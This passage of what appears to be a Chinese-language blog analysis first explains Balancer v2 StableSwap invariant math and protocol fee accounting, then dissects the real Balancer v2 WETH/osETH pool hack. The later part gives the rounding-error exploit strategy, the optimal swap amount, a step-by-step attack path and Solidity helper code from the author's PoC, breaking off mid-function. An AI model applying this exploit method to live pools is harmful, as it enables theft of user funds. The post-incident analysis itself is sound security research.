            Math.divDown(Math.mul((ampTimesTotal - _AMP_PRECISION), invariant), _AMP_PRECISION).add(
                Math.mul((numTokens + 1), D_P)
            )
        )
    );

    if (invariant > prevInvariant) {
        if (invariant - prevInvariant <= 1) {
            return invariant;
        }
    } else if (prevInvariant - invariant <= 1) {
        return invariant;
    }
}

_revert(Errors.STABLE_INVARIANT_DIDNT_CONVERGE);
```

此处特别需要注意的，我们计算中使用的 `ampTimesTotal = amplificationParameter * numTokens;` 就是上述推导过程中 $An^n$ 。在 Curve 内部，` amplificationParameter` 并不是 $A$ 而是 $An^{n-1}$。在 Curve 相关代码内存在如下内容:

```python
self.A = A  # actually A * n ** (n - 1) because it's an invariant
```

继续回到 `_onRegularSwap` 函数内，我们我们调用 `StableMath._calculateInvariant` 计算出不变量 `invariant` 后，我们会使用 `StableMath._calcOutGivenIn` 计算给定代币数量(`amountGiven`) 对应的代币输出，相同的，我们也会使用 `StableMath._calcInGivenOut` 计算给定代币输出下，需要输入代币的数量。这两个函数底层都是 `_getTokenBalanceGivenInvariantAndAllOtherBalances` 函数，该函数用于在给定 `invariant` 、代币余额的情况下计算某种代币在不变量下应该存在的的余额情况，我们可以给出 `_calcOutGivenIn` 的相关代码:

```solidity
balances[tokenIndexIn] = balances[tokenIndexIn].add(tokenAmountIn);

uint256 finalBalanceOut = _getTokenBalanceGivenInvariantAndAllOtherBalances(
    amplificationParameter,
    balances,
    invariant,
    tokenIndexOut
);

// No need to use checked arithmetic since `tokenAmountIn` was actually added to the same balance right before
// calling `_getTokenBalanceGivenInvariantAndAllOtherBalances` which doesn't alter the balances array.
balances[tokenIndexIn] = balances[tokenIndexIn] - tokenAmountIn;

return balances[tokenIndexOut].sub(finalBalanceOut).sub(1);
```

我们首先使用 `balances[tokenIndexIn] = balances[tokenIndexIn].add(tokenAmountIn);` 将用户输入的代币加入当前余额数组中，然后调用 `_getTokenBalanceGivenInvariantAndAllOtherBalances` 函数要求计算出在当前余额情况下，`tokenIndexOut` 位置的满足不变量的余额，计算完成后，我们需要使用 `balances[tokenIndexIn] = balances[tokenIndexIn] - tokenAmountIn;` 恢复 `balances` 内的数据。最后我们给出兑换的输出情况，此处额外执行了 `sub(1)` 强制向下取整。

此处我们设待计算代币的新余额是 $y$，而其他代币的余额之和为 $S'$ ，乘积为 $P'$。我们可以得到如下 AMM 等式:
$$
An^n(S' + y) + D = ADn^n + \frac{D^{n+1}}{n^nP'y}
$$
上述等式成立时，存在:
$$
f(y) = ADn^n + \frac{D^{n+1}}{n^nP'y} - An^n(S' + y) - D = 0
$$
我们对 $f(y)$ 进行求导:
$$
f'(y) = -\frac{D^{n+1}}{n^nP'y^2} - An^n
$$
那么根据牛顿法，可以获得:
$$
\begin{align*}
y_{\text{next}} &= y - \frac{f(y)}{f'(y)}\\\\
&= y - \frac{ADn^n + \frac{D^{n+1}}{n^nP'y} - An^n(S' + y) - D}{-\frac{D^{n+1}}{n^nP'y^2} - An^n}\\\\
&= y + \frac{ADn^n + \frac{D^{n+1}}{n^nP'y} - An^n(S' + y) - D}{\frac{D^{n+1}}{n^nP'y^2} + An^n}\\\\
&= \frac{\frac{D^{n+1}}{n^nP'y} + An^ny + ADn^n + \frac{D^{n+1}}{n^nP'y} - An^n(S' + y) - D}{\frac{D^{n+1}}{n^nP'y^2} + An^n}\\\\
&= \frac{2\frac{D^{n+1}}{n^nP'y}+ ADn^n - An^nS' - D}{\frac{D^{n+1}}{n^nP'y^2} + An^n}
\end{align*}
$$
接下来，我们引入不变量进行进一步化简，从 AMM 等式内，我们可以获得以下数量关系:
$$
\begin{align*}
ADn^n &= An^n(S' + y) + D - \frac{D^{n+1}}{n^nP'y}\\\\
\frac{D^{n+1}}{n^nP'y} &= An^n(S' + y) + D - ADn^n
\end{align*}
$$
我们首先对分子进行观察，假如我们带入 $\frac{D^{n+1}}{n^nP'y}$ ，那么我们无法简化分子(读者可以自行尝试)，那么此处代入 $ADn^n$ 是显然更加合理的选择:
$$
\begin{align*}
y_{\text{next}} &= \frac{2\frac{D^{n+1}}{n^nP'y}+ ADn^n - An^nS' - D}{\frac{D^{n+1}}{n^nP'y^2} + An^n}\\\\
&= \frac{2\frac{D^{n+1}}{n^nP'y}+ An^n(S' + y) + D - \frac{D^{n+1}}{n^nP'y} - An^nS' - D}{\frac{D^{n+1}}{n^nP'y^2} + An^n}\\\\
&= \frac{\frac{D^{n+1}}{n^nP'y}+An^ny}{\frac{D^{n+1}}{n^nP'y^2} + An^n}\\\\
&= \frac{\frac{D^{n+1}}{n^nP'y}\frac{y}{An^n} + y^2}{\frac{D^{n+1}}{n^nP'y^2}\frac{y}{An^n} + y}\\\\
&= \frac{\frac{D^{n+1}}{An^n n^nP'} + y^2}{\frac{D^{n+1}}{n^nP'y}\frac{1}{An^n} + y}\\\\
\end{align*}
$$
我们在分目中代入 $\frac{D^{n+1}}{n^nP'y}$ :
$$
\begin{align*}
y_{\text{next}} &= \frac{\frac{D^{n+1}}{An^n n^nP'} + y^2}{\frac{D^{n+1}}{n^nP'y}\frac{1}{An^n} + y}\\\\
&= \frac{\frac{D^{n+1}}{An^n n^nP'} + y^2}{(An^n(S' + y) + D - ADn^n)\frac{1}{An^n} + y}\\\\
&= \frac{\frac{D^{n+1}}{An^n n^nP'} + y^2}{S' + 2y + \frac{D}{An^n} - D}
\end{align*}
$$
在 Curve 中，我们约定了以下变量:
$$
\begin{align*}
c &= \frac{D^{n+1}}{An^nn^nP'}\\\\
b &= S' + \frac{D}{An^n}
\end{align*}
$$
由此，我们可以将上述 $y_{\text{next}}$ 的计算公式修改为:
$$
y_{\text{next}} = \frac{y^2 + c}{2y + b - D}
$$
我们可以在 `_getTokenBalanceGivenInvariantAndAllOtherBalances` 看到如下代码。我们

```solidity
uint256 ampTimesTotal = amplificationParameter * balances.length;
uint256 sum = balances[0];
uint256 P_D = balances[0] * balances.length;
for (uint256 j = 1; j < balances.length; j++) {
    P_D = Math.divDown(Math.mul(Math.mul(P_D, balances[j]), balances.length), invariant);
    sum = sum.add(balances[j]);
}
// No need to use safe math, based on the loop above `sum` is greater than or equal to `balances[tokenIndex]`
sum = sum - balances[tokenIndex];

uint256 inv2 = Math.mul(invariant, invariant);
// We remove the balance from c by multiplying it
uint256 c = Math.mul(
    Math.mul(Math.divUp(inv2, Math.mul(ampTimesTotal, P_D)), _AMP_PRECISION),
    balances[tokenIndex]
);
uint256 b = sum.add(Math.mul(Math.divDown(invariant, ampTimesTotal), _AMP_PRECISION));
```

此处的 `ampTimesTotal` 对应 $An^n$ 数值，而 `sum` 用于计算 $S'$ 数值，`P_D` 的数值为 $Pn^n / D^{n-1}$ ，此处我们使用 `inv2` 与 `P_D` 进行触发计算计算出最终的结果，最后与 `balances[tokenIndex]` 相乘实现 $P \to P'$ 的变化。最后，我们会使用如下迭代获得最终的 Swap 的代币数量:

```solidity
for (uint256 i = 0; i < 255; i++) {
    prevTokenBalance = tokenBalance;

    tokenBalance = Math.divUp(
        Math.mul(tokenBalance, tokenBalance).add(c),
        Math.mul(tokenBalance, 2).add(b).sub(invariant)
    );

    if (tokenBalance > prevTokenBalance) {
        if (tokenBalance - prevTokenBalance <= 1) {
            return tokenBalance;
        }
    } else if (prevTokenBalance - tokenBalance <= 1) {
        return tokenBalance;
    }
}
```

### 手续费管理

对于手续费管理，我们主要关注 `_doExit` 函数，该函数在处理 BPT 退出时进行了手续费的最终结算。注意，上述 Swap 等过程中，所有的手续费都直接体现在 Pool 的余额上，即 Pool 内的某一个代币会与计算出的结果多一些。这也是为什么在 `_onRegularSwap` 函数内部存在如下代码:

```solidity
uint256 invariant = StableMath._calculateInvariant(currentAmp, balances);
```

该代码的目的就是每次根据当前的池子中的余额重新计算不变量，而不是直接存储不变量的数值。首先，我们需要明确交易手续费会被分配给 BPT 代币。因为 BPT 代币持有者本质上为 Pool 提供了流动性，所以交易手续费分配给 BPT 代币持有者是正常的。在刚刚，我们提到交易手续费会被体现在当前 Pool 内的代币余额上，所以最简单获取代币手续费的方法就是直接根据当前的代币余额进行 BPT 兑换。因为当前的代币余额内已经包含了手续费，所以 BPT 兑换出的代币会多于存入流动性时所支付的代币。以下代码展示了 BPT 使用 `_exitExactBPTInForTokenOut` 内部函数退出时的核心部分:

```solidity
// And then assign the result to the selected token.
amountsOut[tokenIndex] = StableMath._calcTokenOutGivenExactBptIn(
    currentAmp,
    balances,
    tokenIndex,
    bptAmountIn,
    actualSupply,
    preJoinExitInvariant,
    getSwapFeePercentage()
);
```

另一个较为复杂的手续费管理是协议手续费，协议手续费的计算发生在用户 join 和 exit 过程中，在 `_exitExactBPTInForTokenOut` 函数内，我们可以看到 `_beforeJoinExit` 和 `_updateInvariantAfterJoinExit`，这两个函数分别在 `_doJoinOrExit` 之前被调用和之后被调用。

对于 `_beforeJoinExit` 函数，该函数的核心目标是计算在两次流动性变化之间，协议管理者可以获得的手续费和底层资产生息的分成。而 `_updateInvariantAfterJoinExit` 主要用于计算用户刚刚执行的流动性管理支付的手续费分成并更新数据用于下一次 `_beforeJoinExit` 计算。

我们先分析较为简单的 `_updateInvariantAfterJoinExit` 函数的实现:

```solidity
uint256 postJoinExitInvariant = StableMath._calculateInvariant(currentAmp, balances);

// Compute the portion of the invariant increase due to fees
uint256 supplyGrowthRatio = postJoinExitSupply.divDown(preJoinExitSupply);
uint256 feelessInvariant = preJoinExitInvariant.mulDown(supplyGrowthRatio);
```

上述代码首先计算用户完成 `join` 或 `exit` 后的不变量，这是因为用户在 `join` 或 `exit` 过程中有可能需要支付手续费，这部分手续费会增加 Pool 的余额，此处使用 `balances` 进行了重新计算。当然，假如读者详细阅读过 `_doJoin` 和 `_doExit` 的代码就可以知道在某些情况下，用户不需要支付 Swap 手续费。

然后，使用 `postJoinExitSupply / preJoinExitSupply` 计算出当前 BPT 供应量的增长情况，继而计算出在没有手续费情况下，`preJoinExitInvariant` 增长后的 `feelessInvariant` 不变量。由于存在手续费，BPT 供应量的增加会多于没有手续费情况下的 BPT 供应量增加。这说明在有手续费情况下， `feelessInvariant` 的数值会小于 `postJoinExitInvariant`。

然后，我们计算出这部分手续费的数量，并支付给 Protocol Owner:

```solidity
if (postJoinExitInvariant > feelessInvariant) {
    uint256 invariantDeltaFromFees = postJoinExitInvariant - feelessInvariant;

    // To convert to a percentage of pool ownership, multiply by the rate,
    // then normalize against the final invariant
    uint256 protocolOwnershipPercentage = Math.divDown(
        Math.mul(invariantDeltaFromFees, getProtocolFeePercentageCache(ProtocolFeeType.SWAP)),
        postJoinExitInvariant
    );

    if (protocolOwnershipPercentage > 0) {
        uint256 protocolFeeAmount = ExternalFees.bptForPoolOwnershipPercentage(
            postJoinExitSupply,
            protocolOwnershipPercentage
        );

        _payProtocolFees(protocolFeeAmount);
    }
}
```

上述代码计算出 Swap Fee 对应的不变量的变化，然后继而计算出 `invariantDeltaFromFees` 等效的 BPT 代币数量，然后按照 `protocolOwnershipPercentage` 分配这部分 BPT 代币给 Owner。

最后，在 `_updateInvariantAfterJoinExit` 内部，我们会调用 `_updatePostJoinExit` 更新数据，相关实现如下:

```solidity
function _updatePostJoinExit(uint256 currentAmp, uint256 postJoinExitInvariant) internal {
    _lastJoinExitData =
        WordCodec.encodeUint(currentAmp, _LAST_JOIN_EXIT_AMPLIFICATION_OFFSET, _LAST_JOIN_EXIT_AMPLIFICATION_SIZE) |
        WordCodec.encodeUint(
            postJoinExitInvariant,
            _LAST_POST_JOIN_EXIT_INVARIANT_OFFSET,
            _LAST_POST_JOIN_EXIT_INVARIANT_SIZE
        );

    _updateOldRates();
}
```

其中保存的 `currentAmp` 用于后续动态计算 `AmplificationParameter` 过程，而 `_updateOldRates` 是在更新池子中资产的收益率情况。这里的数据更新其实涉及到 Potocol Owner 到底可以获得哪些收益的问题，我们即将介绍的 `_beforeJoinExit` 函数核心也是处理此问题。在 `_getProtocolPoolOwnershipPercentage` 给出了以下注释:

```solidity
        //   ┌───────────────────────┐ ──┐
        //   │  exempt yield         │   │  total growth invariant
        //   ├───────────────────────┤   │ ──┐
        //   │  non-exempt yield     │   │   │  non-exempt growth invariant
        //   ├───────────────────────┤   │   │ ──┐
        //   │  swap fees            │   │   │   │  swap fee growth invariant
        //   ├───────────────────────┤   │   │   │ ──┐
        //   │   original value      │   │   │   │   │  last post join-exit invariant
        //   └───────────────────────┘ ──┘ ──┘ ──┘ ──┘
```

上述注释显示了 Protocol Owner 可以获得的收益类型，分为以下几类:

1. swap fee 是最容易理解的收益，这部分收益直接来自用户的代币兑换
2. non-exempt yield 是一个较难理解的收益来源，该部分收益来源于底层资产的收益率。在 Balancer 内，Pool 内部包含类似 wstETH 这种收益代币，Protocol 可能选择对这部分资产的收益进行征收手续费，当然，也可以选择对这部分资产不征收手续费，就是上图中的 `exempt yield`

在计算 SwapFee 时，我们应该剔除代币收益带来的影响，所以以下代码内使用 `_getAdjustedBalances` 将所有的代币余额进行修正，代码如下:

```solidity
swapFeeGrowthInvariant = StableMath._calculateInvariant(
    lastJoinExitAmp,
    _getAdjustedBalances(balances, true) // Adjust all balances
);
```

此处的 `_getAdjustedBalances` 的实现如下:

```solidity
function _getAdjustedBalances(uint256[] memory balances, bool ignoreExemptFlags)
    internal
    view
    returns (uint256[] memory)
{
    uint256 totalTokensWithoutBpt = balances.length;
    uint256[] memory adjustedBalances = new uint256[](totalTokensWithoutBpt);

    for (uint256 i = 0; i < totalTokensWithoutBpt; ++i) {
        uint256 skipBptIndex = i >= getBptIndex() ? i + 1 : i;
        adjustedBalances[i] = _isTokenExemptFromYieldProtocolFee(skipBptIndex) ||
            (ignoreExemptFlags && _hasRateProvider(skipBptIndex))
            ? _adjustedBalance(balances[i], _tokenRateCaches[skipBptIndex])
            : balances[i];
    }

    return adjustedBalances;
}

// Compute balance * oldRate/currentRate, doing division last to minimize rounding error.
function _adjustedBalance(uint256 balance, bytes32 cache) private pure returns (uint256) {
    return Math.divDown(Math.mul(balance, cache.getOldRate()), cache.getCurrentRate());
}
```

上述函数的核心目的是通过本地缓存中的 `_tokenRateCaches` 计算某种代币在当前 ReteProvider 下的价格，此处的 ReteProvider 是一个类似预言机的组件，用于汇报代币按照历史收益率计算出的公允价格。比如 wstETH 的价格是靠过去 ETH 质押的利率计算出的。我们可以理解 `swapFeeGrowthInvariant` 的计算过程，等同于将余额内所有的代币按照利率进行修正，所以这样计算出的不变量不包含 yield 部分，所以相比于包含 yield 的 balance，不包含 yield 的 balance 会更小，换言之 `_getAdjustedBalances(balances, true) <= _getAdjustedBalances(balances, false)`

接下来，我们会对三种不同的情况进行讨论，第一种情况是 `_areNoTokensExempt`，即所有的代币都会被征收 yield fee，所以此时 `non-exempt yield = 0`，所以 `totalGrowthInvariant = totalNonExemptGrowthInvariant`。我们可以获得如下代码:

```solidity
if (_areNoTokensExempt()) {
    // If there are no tokens with fee-exempt yield, then the total non-exempt growth will equal the total
    // growth: all yield growth is non-exempt. There's also no point in adjusting balances, since we
    // already know none are exempt.

    totalNonExemptGrowthInvariant = StableMath._calculateInvariant(lastJoinExitAmp, balances);
    totalGrowthInvariant = totalNonExemptGrowthInvariant;
}
```

第二种情况是 `_areAllTokensExempt`，即所有的代币都不被征收 yield fee，此时 `exempt yield = 0`，所以存在如下情况：

```solidity
else if (_areAllTokensExempt()) {
    // If no tokens are charged fees on yield, then the non-exempt growth is equal to the swap fee growth - no
    // yield fees will be collected.

    totalNonExemptGrowthInvariant = swapFeeGrowthInvariant;
    totalGrowthInvariant = StableMath._calculateInvariant(lastJoinExitAmp, balances);
} 
```

最后，我们讨论部分代币被征收 yield fee 的情况，此时我们想要选择性调整代币余额，存在如下代码:

```solidity
totalNonExemptGrowthInvariant = StableMath._calculateInvariant(
    lastJoinExitAmp,
    _getAdjustedBalances(balances, false) // Only adjust non-exempt balances
);

totalGrowthInvariant = StableMath._calculateInvariant(lastJoinExitAmp, balances);
```

当我们获得在几种不同情况下的 `swapFeeGrowthInvariant` / `totalNonExemptGrowthInvariant` / `totalGrowthInvariant` 后，我们可以在 `_getProtocolPoolOwnershipPercentage` 看到详细的手续费计算方法:

```solidity
uint256 swapFeeGrowthInvariantDelta = (swapFeeGrowthInvariant > lastPostJoinExitInvariant)
    ? swapFeeGrowthInvariant - lastPostJoinExitInvariant
    : 0;
uint256 nonExemptYieldGrowthInvariantDelta = (totalNonExemptGrowthInvariant > swapFeeGrowthInvariant)
    ? totalNonExemptGrowthInvariant - swapFeeGrowthInvariant
    : 0;

// We can now derive what percentage of the Pool's total value each invariant delta represents by dividing by
// the total growth invariant. These values, multiplied by the protocol fee percentage for each growth type,
// represent the percentage of Pool ownership the protocol should have due to each source.

uint256 protocolSwapFeePercentage = swapFeeGrowthInvariantDelta.divDown(totalGrowthInvariant).mulDown(
    getProtocolFeePercentageCache(ProtocolFeeType.SWAP)
);

uint256 protocolYieldPercentage = nonExemptYieldGrowthInvariantDelta.divDown(totalGrowthInvariant).mulDown(
    getProtocolFeePercentageCache(ProtocolFeeType.YIELD)
);

// These percentages can then be simply added to compute the total protocol Pool ownership percentage.
// This is naturally bounded above by FixedPoint.ONE so this addition cannot overflow.
return (protocolSwapFeePercentage + protocolYieldPercentage, totalGrowthInvariant);
```

我们首先计算出可能存在的 `swapFeeGrowthInvariantDelta` 和 `nonExemptYieldGrowthInvariantDelta`，然后分别依据 `SWAP` 和 `YIELD` 级别手续费计算最终的综合手续费 `protocolSwapFeePercentage + protocolYieldPercentage`。

计算完成上述手续费后，我们最终会在 `_payProtocolFeesBeforeJoinExit` 基于上述手续费为 Protocol Owner 铸造 BPT 代币:

```solidity
(
    uint256 expectedProtocolOwnershipPercentage,
    uint256 currentInvariantWithLastJoinExitAmp
) = _getProtocolPoolOwnershipPercentage(balances, lastJoinExitAmp, lastPostJoinExitInvariant);

// Now that we know what percentage of the Pool's current value the protocol should own, we can compute how
// much BPT we need to mint to get to this state. Since we're going to mint BPT for the protocol, the value
// of each BPT is going to be reduced as all LPs get diluted.
uint256 protocolFeeAmount = ExternalFees.bptForPoolOwnershipPercentage(
    virtualSupply,
    expectedProtocolOwnershipPercentage
);

_payProtocolFees(protocolFeeAmount);
```

此处的 `_payProtocolFees` 实现如下:

```solidity
function _payProtocolFees(uint256 bptAmount) internal {
    if (bptAmount > 0) {
        _mintPoolTokens(address(getProtocolFeesCollector()), bptAmount);
    }
}
```

## Balancer v2 Hack

在本文中，我们主要依据主网上的一笔 [黑客交易](https://app.blocksec.com/explorer/tx/eth/0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742) 进行分析，我们主要分析 WETH/osETH Pool 被盗的过程和细节。笔者已经编写了本次攻击的 [PoC 合约](https://github.com/wangshouh/balancer-v2-poc)，后续分析基本都建立在该 PoC 上。

从上文中，我们知道以下代码是被黑的核心:

```solidity
swapRequest.amount = _upscale(swapRequest.amount, scalingFactors[indexOut]);
```

此处我们需要获得 `scalingFactors` 参数，该参数可以通过 `getScalingFactors` 获得，这也是攻击交易的最初读取的核心数据，我们可以从攻击交易日志内看到，攻击交易发起时，存在以下参数:

```
WETH = 1000000000000000000
BPT = 1000000000000000000
osETH = 1058109553424427048
```

在 `_upscale` 计算中，产生误差的代码如下:

```solidity
function mulDown(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 product = a * b;
    _require(a == 0 || product / a == b, Errors.MUL_OVERFLOW);

    return product / ONE;
}

```

对于 `scalingFactor = 1e18` 的 WETH 和 BPT 资产，我们使用上述 `a * b / ONE` 的计算无法获得任何包含误差的结果，但对于 `osETH` 资产，由于其 `scalingFactor = 1058109553424427048`，此时会出现舍入漏洞。我们的目标是找到某一个数值最大化误差，误差本质来自于 `1058109553424427048 - 1e18 = 58109553424427008`，我们记该数值为 $\delta$，我们可以得到如下推导:
$$
\begin{align*}
S(x) = \lfloor x \cdot (1e18 + \delta) \rfloor
 = \lfloor x \times 1e18 + x\delta \rfloor
 = x \times 1e18 + \lfloor x\delta \rfloor
\end{align*}
$$

上述推导中的 $x$ 是我们的目标，即我们希望求解出 $x$ 获得最大化误差。上述公式内的 $a \times 1e18$ 除以 `ONE` 是精确的，但是 $\lfloor a\delta \rfloor$ 除以 `ONE` 则是误差的来源。我们希望最大化误差，其实就是求解:
$$
x\delta < 1e18
$$
最终，我们可以获得如下结果:

```
x = 1e18 / (factory - 1e18)
```

以上文内的 `osETH` 为例，我们可以计算出最大化误差需要的交易数量，以下计算可以在 `chisel` 内完成:

```
➜ uint256 factory = 1058109553424427048;
➜ 1e18 / (factory - 1e18)
Type: uint256
├ Hex: 0x11
├ Hex (full word): 0x0000000000000000000000000000000000000000000000000000000000000011
└ Decimal: 17
```

上述方法可以在每次兑换时使得输入资产的价值小于输出资产的价值，多次迭代可以获得一定收益，但是收益并不高。我们需要一种方法放大损失。此时，我们想到了上文中的 BPT 代币兑换。在上文介绍流动性管理时，我们提到 BPT 的价格本质上与 $D$ 直接挂钩，而 $D$ 的计算只需要不包含 BPT 的其他资产的余额。

将上述两条联系起来，我们可以利用舍入误差推动系统内的不变量 $D$ 减小，因为舍入误差存在会使得每次兑换都使得 Balancer 池子中的两种代币的余额都减小，我们可以实现该目标的原因在 Vault 内的 `_processGeneralPoolSwapRequest` 使用了代码实现:

```solidity
amountCalculated = pool.onSwap(request, currentBalances, indexIn, indexOut);
(uint256 amountIn, uint256 amountOut) = _getAmounts(request.kind, request.amount, amountCalculated);
tokenInBalance = tokenInBalance.increaseCash(amountIn);
tokenOutBalance = tokenOutBalance.decreaseCash(amountOut);
```

我们会根据用户的 `request.amount` 和 `onSwap` 返回值修改 Valut 内记录的 ` tokenBalance`，这导致我们可以通过舍入问题同时减小池子内的 `WETH` 和 `osETH` 余额。这会导致 $D$ 数值降低，并进一步导致 BPT 价格被严重低估，这样我们就可以利用小额资产换取大量 BPT 代币完成获利。

综上所述，我们可以利用以下路径完成黑客攻击:

1. 将系统内的  `BPT` 代币兑换为 `WETH` 和 `osETH` 代币，降低 Pool 内的余额，方便后续舍入误差操作，此时我们使用的 BPT 代币类似闪电贷获得的，在 swap 最后需要偿还
2. 使用 `17` 作为核心参数不断兑换，利用舍入误差降低 Pool 的 $D$ 值，在 Pool 内 $x_i$ 较小的情况下，舍入误差对 $D$ 的影响会被放大
3. 将一部分 `WETH` 和 `osETH` 代币换回 `BPT` 代币偿还第一步的欠债

> 但是似乎还存在另一种攻击路径，可以不借助 $D$ 直接利用舍入误差黑掉池子内的资产，Balancer 白帽攻击了自己的池子，该次攻击由 Certora 的工程师发起。在 [此次攻击](https://app.blocksec.com/explorer/tx/eth/0x33d3743adbaf28d897b53a67521ab83172c359b3da6921082d65eea7a6e921de) 内使用了非 BPT 攻击路径，笔者曾做过一个简单的 [背景介绍](https://x.com/wong_ssh/status/1989183134827786557)，在后续文章内，我们可能会分析该交易的攻击方法

目前，我们面临以下两个问题:

1. 构建上述 Swap 过程中，第一步需要将 Pool 内的 `osETH` 和 `WETH` 的余额降低到多少？以及如何构建 swap 交易达成该目的？
2. 如何构建舍入误差交易，以及到底想要进行多少次舍入误差交易才可以实现耗尽池子流动性的目的?
3. 如何构建合适交易偿还欠款，避免交易失败

对于上述三个问题，我们首先处理第一个问题，此处我们可以随便给定一个余额作为我们的目标，比如 `87001`。注意这个目标余额并不是随便选择的，我们会在后文介绍该参数的意义。对于如何将当前系统的余额降低为 `87001`，我们使用的方法很简单，直接将 BPT 代币 swap 为 WETH 和 osETH，在此过程中，我们会不断拿走系统内的 WETH 和 osETH，以此实现降低系统内代币数量的目的。一种最简单的方法是一次性直接 Swap 足够的代币使池子内的余额锁定为 `87001`，但是我们会遇到一个问题，即手续费的处理。

在 Balancer 内部，在进行 BPT 到其他代币转化时，我们会用到  `_calcBptInGivenExactTokensOut` 函数，此处我们注意以下代码:

```solidity
for (uint256 i = 0; i < balances.length; i++) {
    // Swap fees are typically charged on 'token in', but there is no 'token in' here, so we apply it to
    // 'token out'. This results in slightly larger price impact.

    uint256 amountOutWithFee;
    if (invariantRatioWithoutFees > balanceRatiosWithoutFee[i]) {
        uint256 nonTaxableAmount = balances[i].mulDown(invariantRatioWithoutFees.complement());
        uint256 taxableAmount = amountsOut[i].sub(nonTaxableAmount);
        // No need to use checked arithmetic for the swap fee, it is guaranteed to be lower than 50%
        amountOutWithFee = nonTaxableAmount.add(taxableAmount.divUp(FixedPoint.ONE - swapFeePercentage));
    } else {
        amountOutWithFee = amountsOut[i];
    }

    newBalances[i] = balances[i].sub(amountOutWithFee);
}
```

这意味着我们需要为使用 `balances[i].sub(amountOutWithFee);`，假如我们单次兑换大量代币，兑换带来的手续费会导致上述计算下溢，合约会抛出如下错误:

```
│   ├─ [34171] OSETH_BPT::onSwap((1, 0xDACf5Fa19b1f720111609043ac67A9818262850c, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 4922848849752053974918 [4.922e21], 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635, 23716239 [2.371e7], 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x), [4922356564867078856521 [4.922e21], 2596148429267421974637745197985291 [2.596e33], 6851581236039298760900 [6.851e21]], 1, 0)
│   │   └─ ← [Revert] BAL#001
│   └─ ← [Revert] BAL#001
└─ ← [Revert] BAL#001
```

所以此处的方法是根据交易手续费的情况逐步进行交易，一步步使用 BPT 兑换代币耗尽池子内的余额，我们可以编写如下函数:

```solidity
function generateStep1Amounts(uint256 balances, uint256 swapFee, uint256 targetRemain, uint256 maxLength)
    internal
    pure
    returns (uint256 remainAmount, uint256 stepLength, uint256[] memory swapAmounts)
{
    remainAmount = balances;
    uint256 remainAllactionFactor = FixedPoint.ONE - swapFee;
    swapAmounts = new uint256[](maxLength);
    for (uint256 i = 0; i < maxLength; i++) {
        uint256 swapAmount = (remainAmount - targetRemain) * remainAllactionFactor / FixedPoint.ONE;
        if (swapAmount == 0) {
            break;
        }
        stepLength++;
        swapAmounts[i] = swapAmount;
        remainAmount -= swapAmount;

        if (remainAmount <= targetRemain) {
            break;
        }
    }
}
```

上述函数会生成一个列表，列表内包含我们每次交易的代币币数量，核心是通过 `remainAllactionFactor` 避免交易手续费的影响。另一点需要注意的，在 Solidity 内，所有的数组都是静态的，即长度必须要在创建时是已知的。虽然我们可以通过一些内联汇编方法规避这一点，但是为了简化开发，我们此处要求用户传入最大数组长度，我们会在迭代过程中，记录我们使用数组的长度 `stepLength` 将其返回给调用者。

由此以来，我们可以调用以下函数获得每次 Swap 的数量:

```solidity
(uint256 remainETHAmount, uint256 stepETHLength, uint256[] memory stepETHAmount) =
    generateStep1Amounts(balances[0], swapFeePercentage, targetRemainBalance, 10);
(uint256 remainOSETHAmount, uint256 stepOSETHLength, uint256[] memory stepOSETHAmount) =
    generateStep1Amounts(balances[2], swapFeePercentage, targetRemainBalance, 10);
```

那么在这一利用 BPT 兑换 osETH 和 WETH 过程中，我们需要消耗多少  BPT 代币？我们此时需要再次引入之前的概念，BPT 代币价格为:
$$
\frac{D}{\text{total LP Supply}} = \text{price}_{\text{BPT}}
$$
我们实际上可以调用 `getRate` 方法获得 $\text{price}_{\text{BPT}}$ 数据，此处的 price = 1.027347(已经使用 18 位定点小数表示)，而 $\text{total LP Supply}$ 可以使用 `getActualSupply` 获得。由于我们只为后续操作保留了 87001 wei 的余额，所以上述兑换行为约等于完全抽空了资金池。那么我们的问题转变为将池子内的 osETH 和 WETH 抽空需要多少 BPT 代币?

直觉上，我们需要支付 `total LP Supply` 单位 BPT 代币，但实际上我们需要支付 $\text{price}_{\text{BPT}} \times \text{total LP Supply}$ 的代币数量。我这是因为我们需要额外支付 BPT 代币来清空 Pool 内部属于 BPT 累积的收益的部分。

> 以上文中的代码为例，其实我们实际上只支付了  1.0235 倍的 BPT 总供应量而不是 price = 1.0273 倍，其中的微小差别可能来自 swap 手续费影响和留下的部分代币等

接下来，我们需要执行最重要的最大舍入误差的操作，在上文中，我们已经计算了最大化舍入误差的交易数量为 `17`。StableSwap 内部，在边界情况下，我们可以近似使用如下方法计算双币池的 $D$ 值:
$$
D = 2\sqrt{x_1 x_2}
$$
我们假设 $x_1$ 的值代表 osETH 的数量，该数值会在计算过程中由于舍入产生误差，如果希望舍入误差最大化影响 $D$ 的数值，那么 $x_2$ 应该充分大，原因如下:
$$
\sqrt{(x_1 - \delta)x_2} = \sqrt{x_1x_2 - x_2\delta}
$$
上述 $\delta$ 代表误差，我们发现误差会与 $x_2$ 存在乘积关系，所以理论上 $x_2$ 越大越好。在 AMM 中，$x_2$ 充分大其实意味着 $x_1$ 充分小，显然 $\min x_1 = 18$ 成立。假如 $x_1 < 18$ ，那么进行 amount = 17 的兑换后，$x_1$ 会等于或者小于 0，这会触发溢出报错。我们可以构建以下三步实现最大化舍入的目标:

1. 第一次 Swap 结果要求 osETH 的余额为 18，WETH 的余额可以任意
2. 第二次 Swap 的参数是 `GIVEN_OUT` 交易，且 amount = 17，此处交易结束后，osETH 的余额为 1
3. 第三次 Swap 将 WETH 的部分余额转化为 osETH，数量其实并不是特别重要，此处我们选择兑换中将 90% 的 WETH 兑换为 osETH

上述三笔交易可以循环多次执行。但需要注意的，上述 Swap 内的第三笔可能会出现交易失败的情况，在某些情况下，WETH 余额不合理会导致交易失败，我们在编写第三步时可能需要进行多次迭代尝试。

首先，上述交易过程中，我们依赖于交易结束后的代币余额进行计算和判断，所以我们需要在合约内实现与 Balancer v2 一致的交易后代币余额计算，我们不难编写出如下函数:

```solidity
function getAfterSwapOutBalances(
    uint256[] memory balances,
    uint256[] memory scalingFactors,
    uint256 indexIn,
    uint256 indexOut,
    uint256 swapOutAmount,
    uint256 amp,
    uint256 swapFeePercentage
